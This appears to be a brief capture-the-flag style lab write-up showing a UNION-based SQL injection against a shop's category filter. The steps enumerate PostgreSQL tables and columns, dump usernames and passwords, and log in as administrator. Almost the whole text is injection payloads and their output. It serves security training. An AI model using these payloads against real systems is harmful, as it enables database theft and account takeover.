

```bash
GET /filter?category=Tech gifts'
```
```bash
Tech gifts' --
```
```bash
#We get error at 3
Tech gifts' order by 3 --
```
```bash
Tech gifts' UNION SELECT 'a' , 'a' -- 
```
```bash
Tech gifts' UNION SELECT version() , NULL  --

#PostgreSQL 12.18 (Ubuntu 12.18-0ubuntu0.20.04.1)
```
```bash
Tech gifts' UNION SELECT table_name , NULL from information_schema.tables --

#users_qgvxej
```
```bash
Tech gifts' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_qgvxej' --

username_mcupwd
password_weqnoi
```
```bash
Tech gifts' UNION SELECT username_mcupwd,password_weqnoi from users_qgvxej --

administrator 6eatcp9hc861cg4gvy58
wiener wt3apvq460vzgallr2vw
carlos pwbean5zzfbkjxn9t5nj
```
```bash
# We will only login to administrator account and click to home. We completed the lab!
```
